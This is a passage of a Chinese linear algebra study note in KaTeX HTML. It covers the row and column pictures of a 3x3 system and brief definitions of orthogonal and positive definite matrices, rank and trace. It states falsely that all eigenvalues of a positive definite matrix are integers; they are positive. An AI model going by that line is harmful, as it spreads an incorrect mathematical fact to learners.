class="mord"><span class="mord">2</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">−</span><span class="mord">1</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">−</span><span class="mord">1</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">−</span><span class="mord">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">−</span><span class="mord">1</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">4</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span></span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.0510099999999998em;"><span style="top:-2.2500000000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎦</span></span></span><span style="top:-2.8099900000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎥</span></span></span><span style="top:-4.05101em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎤</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55002em;"><span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mpunct">,</span><span class="mspace"> </span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:3.6010299999999997em;vertical-align:-1.55002em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.0510099999999998em;"><span style="top:-2.2500000000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎣</span></span></span><span style="top:-2.8099900000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎢</span></span></span><span style="top:-4.05101em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎡</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55002em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">−</span><span class="mord">1</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">4</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span></span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.0510099999999998em;"><span style="top:-2.2500000000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎦</span></span></span><span style="top:-2.8099900000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎥</span></span></span><span style="top:-4.05101em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎤</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55002em;"><span></span></span></span></span></span></span></span></span></span></span>。<br>在三维直角坐标系中，每一个方程将确定一个平面，而例子中的三个平面会相交于一点，这个点就是方程组的解。<br>同样的，将方程组写成列向量的线性组合，观察列图像：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi><mrow><mo fence="true">[</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>2</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mn>1</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow><mo>+</mo><mi>y</mi><mrow><mo fence="true">[</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mn>1</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>2</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mn>3</mn></mrow></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow><mo>+</mo><mi>z</mi><mrow><mo fence="true">[</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mn>1</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>4</mn></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow><mo>=</mo><mrow><mo fence="true">[</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mn>1</mn></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>4</mn></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow></mrow><annotation encoding="application/x-tex">x\begin{bmatrix}2\\-1\\0\end{bmatrix}+y\begin{bmatrix}-1\\2\\-3\end{bmatrix}+z\begin{bmatrix}0\\-1\\4\end{bmatrix}=\begin{bmatrix}0\\-1\\4\end{bmatrix}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:3.6010299999999997em;vertical-align:-1.55002em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.0510099999999998em;"><span style="top:-2.2500000000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎣</span></span></span><span style="top:-2.8099900000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎢</span></span></span><span style="top:-4.05101em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎡</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55002em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">−</span><span class="mord">1</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span></span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.0510099999999998em;"><span style="top:-2.2500000000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎦</span></span></span><span style="top:-2.8099900000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎥</span></span></span><span style="top:-4.05101em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎤</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55002em;"><span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:3.6010299999999997em;vertical-align:-1.55002em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.0510099999999998em;"><span style="top:-2.2500000000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎣</span></span></span><span style="top:-2.8099900000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎢</span></span></span><span style="top:-4.05101em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎡</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55002em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">−</span><span class="mord">1</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">−</span><span class="mord">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span></span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.0510099999999998em;"><span style="top:-2.2500000000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎦</span></span></span><span style="top:-2.8099900000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎥</span></span></span><span style="top:-4.05101em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎤</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55002em;"><span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:3.6010299999999997em;vertical-align:-1.55002em;"></span><span class="mord mathnormal" style="margin-right:0.04398em;">z</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.0510099999999998em;"><span style="top:-2.2500000000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎣</span></span></span><span style="top:-2.8099900000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎢</span></span></span><span style="top:-4.05101em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎡</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55002em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">−</span><span class="mord">1</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">4</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span></span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.0510099999999998em;"><span style="top:-2.2500000000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎦</span></span></span><span style="top:-2.8099900000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎥</span></span></span><span style="top:-4.05101em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎤</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55002em;"><span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:3.6010299999999997em;vertical-align:-1.55002em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.0510099999999998em;"><span style="top:-2.2500000000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎣</span></span></span><span style="top:-2.8099900000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎢</span></span></span><span style="top:-4.05101em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎡</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55002em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">−</span><span class="mord">1</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">4</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span></span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.0510099999999998em;"><span style="top:-2.2500000000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎦</span></span></span><span style="top:-2.8099900000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎥</span></span></span><span style="top:-4.05101em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎤</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55002em;"><span></span></span></span></span></span></span></span></span></span></span>。易知教授特意安排的例子中最后一个列向量恰巧等于等式右边的<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>b</mi></mrow><annotation encoding="application/x-tex">b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">b</span></span></span></span> 向量，所以我们需要的线性组合为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi><mo>=</mo><mn>0</mn><mo separator="true">,</mo><mi>y</mi><mo>=</mo><mn>0</mn><mo separator="true">,</mo><mi>z</mi><mo>=</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">x=0,y=0,z=1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8388800000000001em;vertical-align:-0.19444em;"></span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8388800000000001em;vertical-align:-0.19444em;"></span><span class="mord">0</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.04398em;">z</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>。假设我们令<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>b</mi><mo>=</mo><mrow><mo fence="true">[</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mo>−</mo><mn>3</mn></mrow></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow></mrow><annotation encoding="application/x-tex">b=\begin{bmatrix}1\\1\\-3\end{bmatrix}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:3.6010299999999997em;vertical-align:-1.55002em;"></span><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.0510099999999998em;"><span style="top:-2.2500000000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎣</span></span></span><span style="top:-2.8099900000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎢</span></span></span><span style="top:-4.05101em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎡</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55002em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">−</span><span class="mord">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span></span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.0510099999999998em;"><span style="top:-2.2500000000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎦</span></span></span><span style="top:-2.8099900000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎥</span></span></span><span style="top:-4.05101em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎤</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55002em;"><span></span></span></span></span></span></span></span></span></span></span>，则需要的线性组合为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi><mo>=</mo><mn>1</mn><mo separator="true">,</mo><mi>y</mi><mo>=</mo><mn>1</mn><mo separator="true">,</mo><mi>z</mi><mo>=</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">x=1,y=1,z=0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8388800000000001em;vertical-align:-0.19444em;"></span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8388800000000001em;vertical-align:-0.19444em;"></span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.04398em;">z</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">0</span></span></span></span>。</p><h3 id="第二讲矩阵消元"><a class="markdownIt-Anchor" href="#第二讲矩阵消元">#</a> 第二讲：矩阵消元</h3><h1 id="算了按老师ppt上把概念捋一遍"><a class="markdownIt-Anchor" href="#算了按老师ppt上把概念捋一遍">#</a> 算了，按老师 PPT 上把概念捋一遍</h1><h3 id="线代"><a class="markdownIt-Anchor" href="#线代">#</a> 线代</h3><h5 id="正交矩阵"><a class="markdownIt-Anchor" href="#正交矩阵">#</a> 正交矩阵</h5><p>如果: <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>A</mi></mrow><annotation encoding="application/x-tex">A</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal">A</span></span></span></span> <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>A</mi><mi>T</mi></msup></mrow><annotation encoding="application/x-tex">A^T</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8413309999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8413309999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span></span></span></span></span></span></span></span> =E (E 为单位矩阵)，则 n 阶实矩阵 A 称为正交矩阵。<br>其接着可证明 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>A</mi><mrow><mo>−</mo><mn>1</mn></mrow></msup></mrow><annotation encoding="application/x-tex">A^{-1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span></span></span></span> = <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>A</mi><mi>T</mi></msup></mrow><annotation encoding="application/x-tex">A^T</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8413309999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8413309999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span></span></span></span></span></span></span></span></p><h5 id="正定矩阵"><a class="markdownIt-Anchor" href="#正定矩阵">#</a> 正定矩阵</h5><blockquote><p>正定矩阵的所有特征值都为整数。如果 A 正定，那么有 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>x</mi><mi>T</mi></msup><mi>A</mi><mi>x</mi></mrow><annotation encoding="application/x-tex">x^TAx</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8413309999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8413309999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span></span></span></span></span><span class="mord mathnormal">A</span><span class="mord mathnormal">x</span></span></span></span> &gt; 0 对任意非零向量都成立。<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>x</mi><mi>T</mi></msup><mi>A</mi><mi>x</mi></mrow><annotation encoding="application/x-tex">x^TAx</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8413309999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8413309999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span></span></span></span></span><span class="mord mathnormal">A</span><span class="mord mathnormal">x</span></span></span></span> &gt;= 0 为半正定矩阵。</p></blockquote><h5 id="矩阵的秩"><a class="markdownIt-Anchor" href="#矩阵的秩">#</a> 矩阵的秩</h5><ul><li>秩是图像经过矩阵变换之后的空间维度<br>简单来说，秩是任意一个矩阵中最大线性无关向量的个数，最大线性无关向量是指：一个矩阵中，线性无关的向量最多是几个。<br>特别注意矩阵的秩 = 行秩 = 列秩。但是，<strong>行满秩的矩阵的秩不一定是列满秩的矩阵的秩</strong>。</li></ul><h5 id="矩阵的迹"><a class="markdownIt-Anchor" href="#矩阵的迹">#</a> 矩阵的迹</h5><p>令域 F 上的 N 维方阵 A 的矩阵元为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>a</mi><mrow><mi>i</mi><mi>j</mi></mrow></msub></mrow><annotation encoding="application/x-tex">a_{ij}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.716668em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathnormal">a</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span>∈F，它的迹定义为对角线矩阵元之和。</p><h3 id="相似性度量"><a 